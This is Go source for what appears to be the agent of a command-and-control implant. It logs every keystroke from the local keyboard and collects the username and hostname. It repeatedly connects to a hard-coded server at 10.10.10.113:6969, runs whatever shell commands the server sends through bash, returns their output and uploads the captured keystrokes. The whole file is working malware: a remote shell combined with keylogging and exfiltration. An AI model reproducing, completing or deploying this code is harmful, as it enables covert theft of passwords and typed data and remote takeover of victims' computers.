package main

import (
	"encoding/gob"
	"fmt"
	"log"
	"net"
	"os/exec"
	"strings"
	"time"

	"github.com/google/uuid"

	"github.com/MarinX/keylogger"
	"github.com/PatronC2/Patron/types"
	"github.com/s-christian/gollehs/lib/logger"
)

// func exec_command(text string) {

// }

func main() {
	//Keylog start
	// find keyboard device, does not require a root permission
	keyboard := keylogger.FindKeyboardDevice()
	cache := "" // cache for keylogs
	k, err := keylogger.New(keyboard)
	if err != nil {
		log.Fatalln(err)
		return
	}
	defer k.Close()

	events := k.Read()

	go func() {
		// range of events
		for e := range events {
			switch e.Type {
			case keylogger.EvKey:

				// if the state of key is pressed
				if e.KeyPress() {
					// fmt.Println("[event] press key ", e.KeyString())
					cache = cache + e.KeyString()
				}

				// if the state of key is released
				if e.KeyRelease() {
					// fmt.Println("[event] release key ", e.KeyString())
					cache = cache + e.KeyString()
				}

				break
			}
		}
	}()

	Agentuuid := uuid.New().String()                         // Agent's uuid generated
	hostname, err := exec.Command("hostname", "-f").Output() // Agent's hostname
	if err != nil {
		log.Fatal(err)
	}
	user, err := exec.Command("whoami").Output() // Agent's Username

	for {
		//First beacon for reqular commands
	RETRY:
		beacon, err := net.Dial("tcp", "10.10.10.113:6969")
		if err != nil {
			// log.Fatalln(err) // maybe try diff IP
			time.Sleep(time.Second * time.Duration(5)) // interval and jitter here
			goto RETRY
		}
		ipAddress := beacon.LocalAddr().(*net.TCPAddr)
		ip := fmt.Sprintf("%v", ipAddress)
		init := Agentuuid + ":" + strings.TrimSuffix(string(user), "\n") + ":" + strings.TrimSuffix(string(hostname), "\n") + ":" + ip + ":NoKeysBeacon"
		// logger.Logf(logger.Debug, "Sending : %s\n", init)
		_, _ = beacon.Write([]byte(init + "\n"))
		dec := gob.NewDecoder(beacon)
		encoder := gob.NewEncoder(beacon)
		logger.Logf(logger.Info, "Server Connected\n")
		instruct := &types.GiveAgentCommand{}
		logger.Logf(logger.Debug, "Struct formed\n")
		err = dec.Decode(instruct)
		if err != nil {
			log.Fatalln(err)
		}
		logger.Logf(logger.Debug, "Received : %s\n", instruct)
		CommandType := instruct.CommandType
		Command := instruct.Command
		CmdOut := ""
		destruct := types.GiveServerResult{}
		if CommandType == "shell" && Command != "" {
			logger.Logf(logger.Debug, "Command to run : %s\n", Command)
			var c *exec.Cmd
			c = exec.Command("bash", "-c", Command)
			buf, _ := c.CombinedOutput()
			if err != nil {
				CmdOut = err.Error()
			}
			CmdOut += string(buf)
			logger.Logf(logger.Done, "Command executed successfully : %s\n", CmdOut)
			destruct = types.GiveServerResult{
				Uuid:        instruct.UpdateAgentConfig.Uuid,
				Result:      "1",
				Output:      CmdOut,
				CommandUUID: instruct.CommandUUID,
			}
		} else { // if CommandType == ""
			destruct = types.GiveServerResult{
				Uuid:        instruct.UpdateAgentConfig.Uuid,
				Result:      "2", // meaning nothing to run
				Output:      "",
				CommandUUID: instruct.CommandUUID,
			}
		}

		err = encoder.Encode(destruct)
		if err != nil {
			log.Fatalln(err)
		}
		logger.Logf(logger.Debug, "Sent encoded struct\n")
		beacon.Close()
		// intVar, err := strconv.Atoi(instruct.UpdateAgentConfig.CallbackFrequency) // apply CallbackFrequency
		time.Sleep(time.Second * time.Duration(5)) // interval and jitter here

		//Second beacon for keylog dump
	KEYRETRY:
		keybeacon, err := net.Dial("tcp", "10.10.10.113:6969")
		if err != nil {
			// log.Fatalln(err) // maybe try diff IP
			time.Sleep(time.Second * time.Duration(5)) // interval and jitter here
			goto KEYRETRY
		}
		keyipAddress := keybeacon.LocalAddr().(*net.TCPAddr)
		keyip := fmt.Sprintf("%v", keyipAddress)
		keyinit := Agentuuid + ":" + strings.TrimSuffix(string(user), "\n") + ":" + strings.TrimSuffix(string(hostname), "\n") + ":" + keyip + ":KeysBeacon"
		// logger.Logf(logger.Debug, "Sending : %s\n", init)
		_, _ = keybeacon.Write([]byte(keyinit + "\n"))
		keydec := gob.NewDecoder(keybeacon)
		keyencoder := gob.NewEncoder(keybeacon)
		logger.Logf(logger.Info, "Server Connected\n")
		keyinstruct := &types.KeySend{}
		logger.Logf(logger.Debug, "Struct formed\n")
		err = keydec.Decode(keyinstruct)
		if err != nil {
			log.Fatalln(err)
		}
		logger.Logf(logger.Debug, "Received : %s\n", keyinstruct)
		Keydestruct := types.KeyReceive{}
		Keydestruct = types.KeyReceive{
			Uuid: keyinstruct.Uuid,
			Keys: cache,
		}
		cache = "" //Clears cache after keylog dump

		err = keyencoder.Encode(Keydestruct)
		if err != nil {
			log.Fatalln(err)
		}
		logger.Logf(logger.Debug, "Sent encoded struct\n")
		keybeacon.Close()
		// intVar, err := strconv.Atoi(instruct.UpdateAgentConfig.CallbackFrequency) // apply CallbackFrequency
		time.Sleep(time.Second * time.Duration(5)) // interval and jitter here
	}

}
